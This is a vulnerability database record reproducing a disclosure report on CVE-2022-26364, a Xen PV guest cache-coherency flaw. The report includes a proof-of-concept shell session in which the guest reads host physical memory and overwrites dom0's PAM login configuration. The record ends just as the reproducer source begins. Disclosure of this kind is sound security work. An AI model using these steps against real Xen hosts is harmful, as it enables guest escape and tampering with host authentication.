{
    "text": "vul_url : ， vul_name : Xen PV Guest Non-SELFSNOOP CPU Memory Corruption ， vul_date : 2022.07.06 ， vul_credit_name : Jann Horn ， vul_risk : High ， vul_local : No ， vul_remote : Yes ， vul_cve : CVE-2022-26364 ， vul_cwe : ， vul_poc : Xen: PV guest on non-SELFSNOOP CPUs can validate non-coherent L2 pagetable ， [I'm not sure whether there are any major users of (unshimmed) Xen PV left, but says it's still a security-supported usecase for 64-bit guests.] ， [Tested on Debian's Xen version 4.14.4-pre (Debian 4.14.3+32-g9de3671772-1~deb11u1)] ， On CPUs without SELFSNOOP support (which I think essentially means \\\"AMD CPUs\\\" nowadays?), a Xen PV domain that has access to a PCI device (which grants the domain the ability to set arbitrary cache attributes on all its pages) can trick Xen into validating an L2 pagetable that contains a cacheline that is marked as clean in the cache but actually differs from main memory. After the pagetable has been validated, an attacker can flush the \\\"clean\\\" cacheline, such that on the next load, unvalidated data from main memory shows up in the pagetable. ， The L2 pagetable validation path (promote_l2_table() can be attacked with this because for zeroed PTEs, it only reads and doesn't write. The L1 pagetable validation path (promote_l1_table() seems to always write to memory in the C code, but the compiler could conceivably elide that write, making the attack possible against that path, too - I haven't checked what compilers actually do there. Thinking further, it might also be a good idea to check the Memory Sharing code, although that isn't security-supported anyway. ， (The same attack might also be possible without a PCI device if an HVM/PVH domain is collaborating with the PV domain - from what I can tell, HVM/PVH can always control their cache attributes, and pages with incoherent cache state could then be freed to Xen's page allocator and reallocated by the PV domain, unless opt_scrub_domheap is set?) ， I made a little reproducer that can be loaded as a kernel module inside a PV guest with PCI passthrough. It gives you a new device /dev/physical_memory using which you can just read and write all physical memory. For example, you can scan around for interesting strings: ， root@pv-guest:~/incoherent_page_table# strings -20 -td /dev/physical_memory ， [.] ， 146006071 auth requisite pam_nologin.so ， 146006107 # Load environment from /etc/environment and ~/.pam_environment ， 146006171 session required pam_env.so readenv=1 ， 146006214 session required pam_env.so readenv=1 envfile=/etc/default/locale ， 146006286 @include common-auth ， 146006308 -auth optional pam_gnome_keyring.so ， 146006346 @include common-account ， Looking at that closer, we can dump the whole page and see that it looks like a pagecache page of a PAM config file from dom0: ， root@pv-guest:~/incoherent_page_table# dd if=/dev/physical_memory bs=1 count=4096 skip=146006016 ， #%PAM-1.0 ， # Block login if they are globally disabled ， auth requisite pam_nologin.so ， [.] ， Then we can clobber it by just dd'ing into it: ， root@pv-guest:~/incoherent_page_table# echo -n 'CLOBBER' | dd of=/dev/physical_memory bs=1 seek=146006046 ， 11+0 records in ， 11+0 records out ， 11 bytes copied, 0.00109982 s, 10.0 kB/s ， root@pv-guest:~/incoherent_page_table# ， And checking from a dom0 shell, the file contents of this config file in dom0 have indeed changed: ， root@jannh-amdbox:/home/user# head -n5 /etc/pam.d/lightdm ， #%PAM-1.0 ， # Block login if thCLOBBERally disabled ， auth requisite pam_nologin.so ， root@jannh-amdbox:/home/user# ， This bug is subject to a 90-day disclosure deadline. If a fix for this ， issue is made available to users before the end of the 90-day deadline, ， this bug report will become public 30 days after the fix was made ， available. Otherwise, this bug report will become public at the deadline. ， The scheduled deadline is 2022-06-06. ， = Reproducer code = ， root@pv-guest:~/incoherent_page_table# cat incoherent_page_table.c"
}